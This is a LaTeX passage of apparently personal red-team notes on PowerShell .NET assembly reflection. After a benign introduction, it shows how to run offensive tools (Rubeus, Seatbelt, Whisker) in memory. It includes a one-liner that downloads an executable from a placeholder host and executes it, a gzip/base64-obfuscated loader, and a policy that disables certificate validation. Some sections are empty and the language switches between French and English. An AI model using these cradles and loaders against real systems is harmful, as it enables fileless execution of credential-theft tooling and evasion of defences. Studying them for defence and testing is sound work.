\section{Assembly Reflection}
\label{pwsh:assembly-reflection}

\subsection{Concepts}



\subsubsection{Assembly}
A .NET assembly is a compiled code library used in the .NET framework, which can contain executable code and resources.

Components of an Assembly:
\begin{itemize}
    \item 
        Modules: The basic building blocks of an assembly. Each assembly contains one or more modules. A module is a portable executable file such as a DLL or EXE.
    \item 
    Types: Classes, interfaces, enums, structs, and delegates defined within the assembly.
    \item 
    Metadata: Information about the types defined in the assembly, including their names, visibility, base classes, and members. This metadata is used by the .NET runtime to enforce type safety and manage the execution of the code.
    \item 
    Manifest: Contains information about the assembly itself, including its version, culture, and a list of all files that make up the assembly. The manifest is part of the assembly's metadata.
\end{itemize}

Types of Assemblies:
\begin{itemize}
    \item 
        Private Assemblies: Used by a single application and stored in the application's directory.
    \item 
        Shared Assemblies: Intended to be shared among multiple applications and are usually stored in the Global Assembly Cache (GAC).
\end{itemize}

\subsubsection{Type}
In PowerShell when working with assemblies, a \verb+type+ refers to a data structure that defines the characteristics and behaviors of objects. Types in PowerShell can be classes, structs, enums, interfaces, or delegates defined within a .NET assembly.

\subsection{.NET interaction}




\subsubsection{Type interaction}

{\bf add types}:
\begin{verbatim}
Add-Type -AssemblyName 'System.Windows.Forms'
Add-Type -AssemblyName 'C:\src\universal\src\output\Universal.Cmdlets.dll'

# bypass certificate signing
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$Source = @"
public class BasicTest
{
  public static int Add(int a, int b)
    {
        return (a + b);
    }
  public int Multiply(int a, int b)
    {
    return (a * b);
    }
}
"@

Add-Type -TypeDefinition $Source
\end{verbatim}

 
{\bf Create Type instance}

\begin{verbatim}
# if namespace defined
[<DLL_NAMESPACE>.<DLL_OBJECT>]::<method>(<parameters>)

# OR

$i = New-Object <DLL_CLASS>
$i.<prop1> = <value>
$r = $i.function()

[BasicTest]::Add(4, 3)
$BasicTestObject = New-Object BasicTest
[BasicTest] | Get-Member
\end{verbatim}


\subsubsection{Loading assemblies}

\href{https://learn.microsoft.com/en-us/dotnet/api/system.reflection?view=net-8.0}{System.Reflection} Contains types that retrieve information about assemblies, modules, members, parameters, and other entities in managed code by examining their metadata. These types also can be used to manipulate instances of loaded types, for example to hook up events or to invoke methods. 


\href{https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly?view=net-8.0}{System.Reflection.Assembly} Class Represents an assembly.

Note: the left-most parts of the namespace can be dropped as long as it does not lead to any ambiguity.


LoadFile:
\begin{verbatim}
# LoadFile
$assembly = [Reflection.Assembly]::LoadFile("c:\temp\file.dll")

# LoadFrom
[System.Reflection.Assembly]::LoadFrom('C:\src\universal\src\output\Universal.Cmdlets.dll')

# LoadWithPartialName (deprecated) similar to Add-Type -AssemblyName
[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
\end{verbatim}


\verb+Import-Module+ (load assemblies and expose any cmdlets, cannot load exe assemblies): 
\begin{verbatim}
Import-Module 'C:\src\universal\src\output\Universal.Cmdlets.dll'
\end{verbatim}

\verb+using Statement+ (at parse time used when defining PowerShell classes): 
\begin{verbatim}
using assembly C:\src\universal\src\output\Universal.Cmdlets.dll
\end{verbatim}


\verb+Load(Byte[])+:


\subsection{Load and run a c\# binary}
\label{pwsh:assembly-reflection:run-csharp}

\subsubsection{Calling main function}

\href{http://theredwindows.net/index.php/2021/07/28/reflexion-en-powershell/}{Reflexion in powershell}

S’il s’agît d’un exécutable .NET, on peut alors invoquer la méthode \verb+Main()+ en utilisant la propriété \verb+.EntryPoint+ et lui appliquer la méthode \verb+.Invoke()+ ; à l’image de tout à l’heure avec les paramètres suivants \verb+$null, [Object[]] @(@(,([String[]] @())))+ where the last array contains the args to be ssed to the binary


Si l’assembly n’est pas un exécutable, \verb+.EntryPoint+ retourne \verb+$null+

Sinon il faut connaître les espaces de noms/classes/méthodes de l’assembly chargée pour les appeler de la même manière que les types habituels. Petit 

Example:
\begin{verbatim}
$assembly = [System.Reflection.Assembly]::LoadFile("D:\tools\Rubeus\Rubeus\bin\debug\Rubeus.exe")
$assembly.EntryPoint.Invoke($null, [Object[]] @(@(,([String[]] @("triage")))))
\end{verbatim}

Another solution but requiere to have knowledge on the namespace and the class:
\begin{verbatim}
[System.Reflection.Assembly]::Load($byteOutArray)
[Whisker.Program]::main($Command.Split(" "))
\end{verbatim}


\subsection{Obfuscated}

{\bf gziped}:
\begin{verbatim}
# Base64 decode
$gzipBytes = [Convert]::FromBase64String($gzipB64);

# Gzip decompress
$gzipMemoryStream = New-Object IO.MemoryStream(, $gzipBytes);
$gzipStream = New-Object System.IO.Compression.GzipStream($gzipMemoryStream, 
                                [IO.Compression.CompressionMode]::Decompress);
$seatbeltMemoryStream = New-Object System.IO.MemoryStream;
$gzipStream.CopyTo($seatbeltMemoryStream);
\end{verbatim}


{\bf aes}

{\bf xor}

\subsubsection{STDOUT redirection to the console}

\begin{verbatim}
# Redirect assembly STDOUT to console
$OldConsoleOut = [Console]::Out;
$StringWriter = New-Object IO.StringWriter;
[Console]::SetOut($StringWriter);

# Call main
# ...

# Reset STDOUT
[Console]::SetOut($OldConsoleOut);
$Results = $StringWriter.ToString();
$Results;
\end{verbatim}



\subsubsection{Oneliner without obfuscation}

\begin{verbatim}
$asm.EntryPoint.Invoke($null, [Object[]] @(@(,([String[]] @("triage")))))

$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<asm_ref_bin_path><asm_ref_exe_name>.exe'); $asm = [System.Reflection.Assembly]::Load($data); $OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,([String[]] @(<asm_ref_params>)))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```
= asm_ref_bin_path: windows/NetFramework_4.7_x64/
= asm_ref_exe_name: Seatbelt
= asm_ref_exe_cmd: "klist"
= asm_ref_params: "-group=all", "-full"
\end{verbatim}


\subsubsection{Function with obfuscation}

In this case it load a gzip c\# binary

\href{https://cyberchef.org/}{Cyberchef}
\begin{itemize}
    \item Gzip (Compression type: Dynamic Huffman Coding)
    \item To Base64 (Alphabet: A-Za-z0-9+/=)
\end{itemize}

this is taken from
\href{https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git}{PowerSharpBinaries}

\begin{verbatim}
function Invoke-Whisker
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = ""

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("HERE"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [Whisker.Program]::main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
\end{verbatim}

it is then possible to dot-source the function and call it
\begin{verbatim}
PS C:\Users\btables\Desktop> . Invoke-Whisker.ps1
PS C:\Users\btables\Desktop> gci -Path Function:\Invoke-Whisker
PS C:\Users\btables\Desktop> Invoke-Whisker
\end{verbatim}

